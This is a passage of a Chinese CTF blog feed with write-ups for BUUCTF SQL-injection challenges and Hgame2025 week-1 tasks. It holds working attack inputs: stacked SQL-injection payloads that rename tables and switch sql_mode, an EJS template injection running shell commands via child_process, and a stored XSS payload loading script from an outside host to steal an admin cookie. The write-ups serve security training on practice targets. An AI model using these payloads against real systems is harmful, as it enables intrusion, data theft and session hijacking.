next;<br><br>关闭表：<br>HANDLER 表名 READ <span class="hljs-keyword">CLOSE</span>;<br></code></pre></td></tr></table></figure><p>本题即先用 handler 打开 <code>1919810931114514</code> 表，读取表的第一行数据，然后关闭表</p><h2 id="方法四：根据原本查询语句的逻辑修改表名和列名（相对取巧）"><a href="#方法四：根据原本查询语句的逻辑修改表名和列名（相对取巧）" class="headerlink" title="方法四：根据原本查询语句的逻辑修改表名和列名（相对取巧）"></a>方法四：根据原本查询语句的逻辑修改表名和列名（相对取巧）</h2><p>我们输入 1 后，默认会显示 id 为 1 的数据，可以猜测默认显示的是 words 表的数据，那么只要更改目标表的名称和结构为 words 表、words 表改成其他名称，就可以达到利用原有查询语句直接查询 flag 字段的值的效果</p><p>修改表名、添加列的语法格式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">修改表名：<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 旧表名 RENAME <span class="hljs-keyword">TO</span> 新表名;<br><br>修改字段：<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 表名 CHANGE 旧字段名 新字段名 新数据类型;<br><br>添加列：<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> TABLE_NAME <span class="hljs-keyword">add</span> <span class="hljs-keyword">column</span> NEW_COLUMN_NAME <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">first</span>;<br></code></pre></td></tr></table></figure><p>查看 words 表结构 <code>1&#39;;desc words;#</code> 总共两个字段 id 和 data，推测应该是输入 id 给出对应 data</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/TnErbguBhoNNlgxeylXc356Fnh7.png"></p><p>那么我们可以把 words 表随便改成其他名称，然后把目标 1919810931114514 表改成 words，再把列名 flag 改成 data，在最前列添加 id 列即可实现查询</p><p><code>1&#39;; alter table words rename to words1;alter table </code> 1919810931114514 <code>rename to words;alter table words change flag data varchar(50);alter table words add column id int(10) not null first;#</code></p><p>执行后，先读取了原本 words 表的 id&#x3D;1 的 data 并返回输出</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/H2nHbYVZRoI1r7xBQKZcaohhnRg.png"></p><p>输入（id）0 查询，即得 flag</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/D8gdb3B62oci4Ix8brjc1Xbon2b.png"></p><p>或者参考我所参考的知乎那篇 wp，直接将 flag 重命名为 id，然后 <code>1&#39; or 1=1#</code> 查看所有内容</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://zhuanlan.zhihu.com/p/545713669">https://zhuanlan.zhihu.com/p/545713669</a></p><p><a href="https://ek1ng.com/notes.html#%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8">https://ek1ng.com/notes.html#%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8</a></p><h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>还是先用 BP 扫一遍，可以看到许多关键词如 and、from、information 被过滤，联合注入、报错注入基本排除</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/T6Trb69KpoBDWDx9kDmcnkqEnsc.png"></p><p>综合考虑先尝试堆叠注入，输入 <code>1;show databases;#</code>，成功获取数据库名，说明是数字型无需其他闭合，且堆叠注入可行</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/KGXUbk5GooGT6Sxv8ypcLW5xnoh.png"></p><p>继续输入 <code>1;show tables;#</code>，发现 Flag 表</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/HaLqbQoEcoXOvSxR864cGDk3nth.png"></p><p>尝试 handler 读取 <code>1;handler Flag open;handler Flag read first;handler Flag close;#</code>，结果发现 Flag 被过滤，因为 handler 和 from 被过滤，也无法使用前一题的预编译绕过，其他各种绕过方法试了一遍，过长时也会拦截，最后只能借鉴网上的 WP。</p><p>这道题需要推测查询语句的大致结构，这里的 sql 语句为 <code>select $post[&#39;query&#39;]||flag from Flag</code>，表现出来的特征是输入非零时有回显，输入 0 或其他字符时均无回显或是报错，做题时需要根据这个特征推测才能继续做下去。</p><h2 id="方法一：修改-sql-mode"><a href="#方法一：修改-sql-mode" class="headerlink" title="方法一：修改 sql_mode"></a>方法一：修改 sql_mode</h2><p>修改 MySQL 服务的环境变量 sql_mode，用于设置 MySQL 支持的语法和数据校验模式。本题将 sql_mode 设为 <code>pipes_as_concat</code>，作用是将 || 的作用由 or 变为拼接字符串。</p><p>所以输入 <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code> 时原有的查询语句就会将 <code>select 1</code> 和 <code>select flag from Flag</code> 的结果拼接在一起返回。</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/F3LUbtmpFomIgYxYKTscUwpSnZd.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">附加几种常见的sql_mode值的介绍：<br><br>几种常见的mode介绍<br>ONLY_FULL_GROUP_BY：出现在<span class="hljs-keyword">select</span>语句、<span class="hljs-keyword">HAVING</span>条件和<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span>语句中的列，必须是<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span>的列或者依赖于<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span>列的函数列。<br><br>NO_AUTO_VALUE_ON_ZERO：该值影响自增长列的插入。默认设置下，插入<span class="hljs-number">0</span>或<span class="hljs-keyword">NULL</span>代表生成下一个自增长值。如果用户希望插入的值为<span class="hljs-number">0</span>，而该列又是自增长的，那么这个选项就有用了。<br><br>STRICT_TRANS_TABLES：在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制<br><br>NO_ZERO_IN_DATE：这个模式影响了是否允许日期中的月份和日包含<span class="hljs-number">0</span>。如果开启此模式，<span class="hljs-number">2016</span><span class="hljs-number">-01</span><span class="hljs-number">-00</span>是不允许的，但是<span class="hljs-number">0000</span><span class="hljs-number">-02</span><span class="hljs-number">-01</span>是允许的。它实际的行为受到 <span class="hljs-keyword">strict</span> mode是否开启的影响<span class="hljs-number">1</span>。<br><br>NO_ZERO_DATE：设置该值，mysql数据库不允许插入零日期。它实际的行为受到 strictmode是否开启的影响<span class="hljs-number">2</span>。<br><br>ERROR_FOR_DIVISION_BY_ZERO：在<span class="hljs-keyword">INSERT</span>或<span class="hljs-keyword">UPDATE</span>过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回<span class="hljs-keyword">NULL</span><br><br>NO_AUTO_CREATE_USER：禁止<span class="hljs-keyword">GRANT</span>创建密码为空的用户<br><br>NO_ENGINE_SUBSTITUTION：如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常<br><br>PIPES_AS_CONCAT：将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似<br><br>ANSI_QUOTES：启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符<br></code></pre></td></tr></table></figure><h2 id="方法二：满足-的条件"><a href="#方法二：满足-的条件" class="headerlink" title="方法二：满足 || 的条件"></a>方法二：满足 || 的条件</h2><p>如果 <code>$post[‘query’]</code> 的数据为 <code>*,1</code>，sql 语句就变成了 <code>select *,1||flag from Flag</code>，也就是 <code>select *,1 from Flag</code>，可以直接查询出 Flag 表中的所有内容。输入 <code>1;select *,1</code></p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/Zey3bJzAMoqJcIx0tC7c8lErnyc.png"></p><h2 id="参考：-1"><a href="#参考：-1" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://ek1ng.com/notes.html#SUSCTF2019-EasySQL">https://ek1ng.com/notes.html#SUSCTF2019-EasySQL</a></p><p><a href="https://www.cnblogs.com/gtx690/p/13176458.html">https://www.cnblogs.com/gtx690/p/13176458.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgame2025 WP</title>
    <link href="/2025/03/02/Hgame2025WP/"/>
    <url>/2025/03/02/Hgame2025WP/</url>
    
    <content type="html"><![CDATA[<h1 id="Hgame2025WP"><a href="#Hgame2025WP" class="headerlink" title="Hgame2025WP"></a>Hgame2025WP</h1><h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><h3 id="TEST-NC"><a href="#TEST-NC" class="headerlink" title="TEST NC"></a>TEST NC</h3><p>连接后 <code>cat flag</code></p><h3 id="从这里开始的序章"><a href="#从这里开始的序章" class="headerlink" title="从这里开始的序章"></a>从这里开始的序章</h3><p>复制粘贴</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h3><p>抓包没有发现通信，纯前端 js 的小游戏</p><p>禁用 F12，其他方式打开开发者工具，审计代码，发现大量名称被重命名混淆，未能找到 gameover、alert、flag 等相关有效信息，所以尝试通关游戏获得 flag。</p><p>在 index.js 发现记录地图数据的 <code>map</code> 字段，经比对发现 0x0 为可移动的空地，0x1 为墙，0x2 为敌人可通过的通道，而后发现 <code>_LIFE = 0x5,_SCORE = 0x0;</code> 分别记录生命值和初始分数。而通关的要求是总分达到 10000 且逃离（完成所有关卡 level）所以总的思路是：修改初始分数到达要求，改变地图结构来快速通关（测试发现要吃完一关内所有豆子才能到下一个关卡，只有 0x0 会刷豆子）并防止敌人扣除生命值</p><p>操作：</p><p>利用 Chrome 的 Overrides 功能将 js 代码重载，用本地文件覆盖</p><p>修改 <code>_SCORE = 0x10000;</code> 直接满足分数要求（16^4）</p><p>用脚本生成一个新地图，限制敌人行动、减少豆子刷新，粘贴替换到 js 文件中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">new_maps=[[[<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>)] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>)]<span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>)]<br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">12</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">31</span>):<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">28</span>):<br>            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">12</span> <span class="hljs-keyword">or</span> i == <span class="hljs-number">16</span>) <span class="hljs-keyword">and</span> c &gt;= <span class="hljs-number">10</span> <span class="hljs-keyword">and</span> c &lt;= <span class="hljs-number">17</span> <span class="hljs-keyword">or</span> (c == <span class="hljs-number">10</span> <span class="hljs-keyword">or</span> c == <span class="hljs-number">17</span>) <span class="hljs-keyword">and</span> i &gt; <span class="hljs-number">12</span> <span class="hljs-keyword">and</span> i &lt; <span class="hljs-number">16</span>:<br>                new_maps[m][i][c] = <span class="hljs-string">&#x27;0x1&#x27;</span><br>            <span class="hljs-keyword">elif</span> i == <span class="hljs-number">23</span> <span class="hljs-keyword">and</span> c == <span class="hljs-number">13</span>:<br>                new_maps[m][i][c] = <span class="hljs-string">&#x27;0x0&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                new_maps[m][i][c] = <span class="hljs-string">&#x27;0x2&#x27;</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;map.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>front=<span class="hljs-string">&quot;&#123;&#x27;map&#x27;: [&quot;</span><br>behind=<span class="hljs-string">&quot;\n&#x27;wall_color&#x27;: _0x3a9ed7(0x12c),&#x27;goods&#x27;: &#123;&#x27;1,3&#x27;: 0x1,&#x27;26,3&#x27;: 0x1,&#x27;1,23&#x27;: 0x1,&#x27;26,23&#x27;: 0x1&#125;&#125;,\n&quot;</span><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">12</span>):<br>    f.write(front)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">31</span>):<br>        f.write(<span class="hljs-string">&#x27;[&#x27;</span>)<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">28</span>):<br>            <span class="hljs-keyword">if</span> c == <span class="hljs-number">27</span>:<br>                f.write(new_maps[m][i][c])<br>                <span class="hljs-keyword">continue</span><br>            f.write(new_maps[m][i][c]+<span class="hljs-string">&#x27;,&#x27;</span>)<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-number">30</span>:<br>            f.write(<span class="hljs-string">&#x27;]&#x27;</span>)<br>        f.write(<span class="hljs-string">&#x27;],&#x27;</span>)<br>    f.write(behind)<br>f.close()<br></code></pre></td></tr></table></figure><p>修改完后保存，刷新页面</p><p><img src="/img/Hgame2025WP/UbBBbUvyRojxIax1hBccxvlHnbd.png"></p><p>游戏一开始只要吃掉原地的豆子就进入下一关，瞬间刷满通关，获得 flag（简单 base64+ 栅栏 fence 解码）</p><p><img src="/img/Hgame2025WP/Y3ySbNIZMoEK5txChctcZ6XTnbf.png"></p><h3 id="Level-47-BandBomb"><a href="#Level-47-BandBomb" class="headerlink" title="Level 47 BandBomb"></a>Level 47 BandBomb</h3><p>审计 app.js 代码，<code>/upload</code> 路由上传文件到 <code>/app/uploads/</code> 目录，没有什么限制，<code>/rename</code> 路由处理重命名，同样几乎没有限制，可以实现目录穿越，相对路径基于 <code>/app/uploads/</code> 目录，<code>/</code> 路由列出 <code>/app/uploads/</code> 目录下的所有文件。使用 express 框架，渲染 ejs 模板返回前端，本地的 <code>/app/public/</code> 目录映射到 <code>/static</code> 路由存放静态资源。</p><p>接下来上靶机，上传任意文件 app.js，使用 BP 向 <code>/rename</code> POST 方法发包，修改文件名 newName 为 <code>../app.js</code> 即可移动文件到 <code>/app/</code> 目录，覆盖原 app.js，但是服务不重启无法利用。同时利用 rename 可以作用于任意目录的文件所以也可以试探文件是否存在，若存在可成功重命名，若不存在则会返回 500 报错。</p><p>考虑靶机为 Nodejs 环境，排除一句话木马，尝试 ejs 模板注入。用 rename 试探到 <code>/app/view/mortis.ejs</code>，将其重命名为 <code>../public/mortis.ejs</code>，下载修改插入</p><p><code>&lt;%= process.mainModule.require(&#39;child_process&#39;).execSync(&#39;find / -type f -name &quot;*flag*&quot; 2&gt;/dev/null -exec cat &#123;&#125; +&#39;) %&gt;</code>，再上传用 rename 移入 <code>/app/view/</code>，刷新，成功执行命令得到返回，但没有找到 flag。</p><p>这里找了好一会，最后在环境变量里终于找到了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;%= <br>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> execSync = process.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">execSync</span>;<br>  <span class="hljs-keyword">const</span> env = <span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;env&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>  <span class="hljs-keyword">const</span> procCmdline = <span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;cat /proc/1/cmdline&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`环境变量:\n<span class="hljs-subst">$&#123;env&#125;</span>\n\n进程参数:\n<span class="hljs-subst">$&#123;procCmdline&#125;</span>`</span>;<br>&#125;)()<br> %&gt;<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame2025WP/NmUCbDUgtotJtIx6TC1cN1nEnP1.png"></p><h3 id="Level-69-MysteryMessageBoard"><a href="#Level-69-MysteryMessageBoard" class="headerlink" title="Level 69 MysteryMessageBoard"></a>Level 69 MysteryMessageBoard</h3><p><img src="/img/Hgame2025WP/C60ObFUJhoAtywx3H3ucTSQKncd.png"></p><p>先登录，用户名应该是 shallot，尝试用 BP 爆破，爆出密码 888888</p><p><img src="/img/Hgame2025WP/IAhcbF5lLoY3QTxLPW0czp0Bnl7.png"></p><p>随后进入留言板，提交 <code>&lt;script&gt;alert(&#39;123&#39;)&lt;/script&gt;</code> 出现弹窗，似乎没有过滤，可以整存储型 XSS，去获取 admin 的 cookie。所以拿 XSS 网站的 payload <code>&lt;sCRiPt sRC=//xs.pe/0c9&gt;&lt;/sCrIpT&gt;</code> 监听即可。</p><p><img src="/img/Hgame2025WP/Bi4bbrUHIoxldRx2Yf4cuzeKnpd.png"></p><p>一开始以为这句“admin 才不会来看你”是反话，是给的提示，后来发现还真没来，被自己无语到了……</p><p>然后突然想起来忘记目录扫描了，一扫扫出来一个 <code>/admin</code></p><p><code>好吧好吧你都这么求我了～admin只好勉为其难的来看看你写了什么～才不是人家想看呢！</code></p><p>……我想这应该行了，然而不知道什么原因还是没有收获。</p><p>后来题目又提供了部分源码，发现思路应该是对的，重新试了一遍，这回成了，得到 admin 的 cookie，访问 <code>/flag</code> 用 BP 修改 cookie 为 admin 的，得到 flag</p><p><img src="/img/Hgame2025WP/QYIlbVcTwoXNRAxaGRgcs3pvn0b.png"></p><p><img src="/img/Hgame2025WP/FT01b9hU0oVaCMxpuIycHxFcnZc.png"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Hakuya-Want-A-Girl-Friend"><a href="#Hakuya-Want-A-Girl-Friend" class="headerlink" title="Hakuya Want A Girl Friend"></a>Hakuya Want A Girl Friend</h3><p>附件 hky.txt 全是 16 进制的文本，开头 <code>50 4B 03 04</code> zip 的文件头，寻找文件尾发现 <code>50 4B 05 06 00 00 00 00 02 00 02 00 C1 00 00 00 9D 00 00 00 00 00</code>，后面还有一长串的冗余估计有其他信息隐藏在冗余部分。冗余部分开头 <code>82 60 42 AE</code>，结尾 <code>47 4E 50 89</code>，推测应该是把 png 图片的编码以一个 16 进制为单位倒转顺序了，正常 png 文件头 <code>89 50 4E 47</code>，结尾 <code>AE 42 60 82</code>。</p><p>所以将两部分文本分开，前部分写个 python 转成二进制文件保存为 zip 后缀即可正常打开，里面有密码加密。</p><p>后面部分先写个 python 把 16 进制数的顺序反转，再用上面的同一个程序转成二进制文件保存为 png 后缀即可。</p><p>然而图片中未找到密码，推测文件宽高被修改，利用 crc 校验得正确宽高 <code>576 779</code>，修改获得隐藏的密码。进入压缩包得 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br><br>crcbp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;new_hky1.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>        data = crcbp[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + \<br>            struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc32 = binascii.crc32(data) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-keyword">if</span>(crc32 == <span class="hljs-number">0xA672282D</span>):    <span class="hljs-comment">#图片当前CRC</span><br>            <span class="hljs-built_in">print</span>(i, j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hex:&#x27;</span>, <span class="hljs-built_in">hex</span>(i), <span class="hljs-built_in">hex</span>(j))<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame2025WP/IBGJbM15ao7yAxxNaRicVpKBnwr.png"></p><h3 id="Level-314-线性走廊中的双生实体"><a href="#Level-314-线性走廊中的双生实体" class="headerlink" title="Level 314 线性走廊中的双生实体"></a>Level 314 线性走廊中的双生实体</h3><p>附件提供了一个神经网络模块 entity.pt 文件，根据题目的提示加载使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">entity = torch.jit.load(<span class="hljs-string">&#x27;entity.pt&#x27;</span>)   <span class="hljs-comment">#加载</span><br><span class="hljs-comment">#准备一个形状为[█，██]的张量，确保其符合“█/█稳定态”条件。</span><br>output = entity(input_tensor)   <span class="hljs-comment">#将张量输入实体以尝试激活信息</span><br></code></pre></td></tr></table></figure><p>先是随便准备了一个张量 tensor([4,14])，报错，意识到提示给的是“形状”，然后搞了一个形状[4,14]的张量，报错</p><p><code>RuntimeError: mat1 and mat2 shapes cannot be multiplied (4x14 and 10x10)</code>，说明内部有矩阵乘法运算且另一个矩阵形状为[10,10]。所以换一个形状[4,10]的张量，<code>print(output)</code> 就有正常输出了，但由于一开始我是 0 到 1 线性取值组成的张量，均值很小，所以没有看到任何有用信息。</p><p>索性开始调试，在 <code>output = entity(input_tensor)</code> 处打断点，查看 entity 的信息。</p><p>顶层的 forward 推理部分如下，<code>linear1 -&gt; security -&gt; relu -&gt; linear2</code></p><p><img src="/img/Hgame2025WP/Q2KUbsSQ0oBWWCxX6g8cb4Qanaf.png"></p><p>linear1 和 linear2 均是使用 <code>torch.nn.functional.linear(input,weight,bias)</code> 做线性变换，<code>output=input*weight+bias</code>，分别使用了形状(10,10)的 weight 和(10,)的 bias、形状(1,10)的 weight 和(1,)的 bias。</p><p><img src="/img/Hgame2025WP/K3TFb1wkXofsMoxXJa4cAx5inQb.png"></p><p><img src="/img/Hgame2025WP/KgynblxjPo2ggnx96LccdhlanAh.png"></p><p>security 的 forward 部分</p><p>当满足 <code>torch.allclose(torch.mean(x0), torch.tensor(0.31415000000000004), rtol=1.0000000000000001e-05, atol=0.0001)</code> 时会从 flag 数组中逐字读取并与 85 异或，拼接输出。其中 <code>torch.mean(x0)</code> 为对张量内所有值取平均（未指定维度），<code>torch.allclose(A,B,rtol,atol)</code> 比较 A、B 两个元素是否接近，|A-B| &lt;&#x3D; atol+rtol*|B| 则为 true。所以综上，要获得 flag，就要使输入的张量 x 经过 linear1 处理后取平均极度接近于 0.31415。（估计这里就是题目暗示的“周率”、和“十方境界”了吧，π*10^-1）</p><p>此外当满足 <code>torch.gt(torch.mean(x),0.5)</code> 时，也就是取平均后大于 0.5 时拼接、输出 fake_flag。（此处的 bool()应该不是 python 自带的 bool 函数，如果是的话那么这条判断应该始终为 true，也就不会出现我一开始的情况了吧，一开始取值太小，又不接近 0.31415，就什么有用的都没）</p><p><img src="/img/Hgame2025WP/MVEPbeJI4o7GCOxjYPScVyO3n3c.png"></p><p>分析完成后写脚本跑出正确的张量输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><br>target_mean = <span class="hljs-number">0.31415000000000004</span><br><br>weight = torch.tensor([<br>    [-<span class="hljs-number">0.1905</span>, -<span class="hljs-number">0.2279</span>, -<span class="hljs-number">0.1038</span>, <span class="hljs-number">0.2425</span>, <span class="hljs-number">0.1687</span>, -<span class="hljs-number">0.0876</span>, -<span class="hljs-number">0.0443</span>, <span class="hljs-number">0.1849</span>,<br>               <span class="hljs-number">0.1420</span>,  <span class="hljs-number">0.2552</span>],<br>             [ <span class="hljs-number">0.1606</span>, -<span class="hljs-number">0.2255</span>,  <span class="hljs-number">0.2935</span>, -<span class="hljs-number">0.1483</span>,  <span class="hljs-number">0.0447</span>, -<span class="hljs-number">0.0528</span>,  <span class="hljs-number">0.3090</span>, -<span class="hljs-number">0.0193</span>,<br>              -<span class="hljs-number">0.0874</span>, -<span class="hljs-number">0.1935</span>],<br>             [-<span class="hljs-number">0.2987</span>, -<span class="hljs-number">0.3123</span>,  <span class="hljs-number">0.1831</span>,  <span class="hljs-number">0.2289</span>, -<span class="hljs-number">0.1729</span>,  <span class="hljs-number">0.0225</span>, -<span class="hljs-number">0.1234</span>,  <span class="hljs-number">0.1704</span>,<br>               <span class="hljs-number">0.2700</span>,  <span class="hljs-number">0.1911</span>],<br>             [ <span class="hljs-number">0.1425</span>,  <span class="hljs-number">0.0841</span>, -<span class="hljs-number">0.2787</span>, -<span class="hljs-number">0.0964</span>, -<span class="hljs-number">0.2263</span>, -<span class="hljs-number">0.2821</span>,  <span class="hljs-number">0.0173</span>,  <span class="hljs-number">0.0279</span>,<br>               <span class="hljs-number">0.2843</span>,  <span class="hljs-number">0.1745</span>],<br>             [ <span class="hljs-number">0.1492</span>, -<span class="hljs-number">0.1212</span>, -<span class="hljs-number">0.3122</span>, -<span class="hljs-number">0.0605</span>,  <span class="hljs-number">0.2146</span>, -<span class="hljs-number">0.2049</span>, -<span class="hljs-number">0.2629</span>,  <span class="hljs-number">0.2081</span>,<br>               <span class="hljs-number">0.2239</span>,  <span class="hljs-number">0.0339</span>],<br>             [ <span class="hljs-number">0.3045</span>, -<span class="hljs-number">0.3089</span>, -<span class="hljs-number">0.0101</span>,  <span class="hljs-number">0.0076</span>,  <span class="hljs-number">0.1810</span>,  <span class="hljs-number">0.2333</span>, -<span class="hljs-number">0.0124</span>,  <span class="hljs-number">0.0553</span>,<br>               <span class="hljs-number">0.1279</span>, -<span class="hljs-number">0.2548</span>],<br>             [-<span 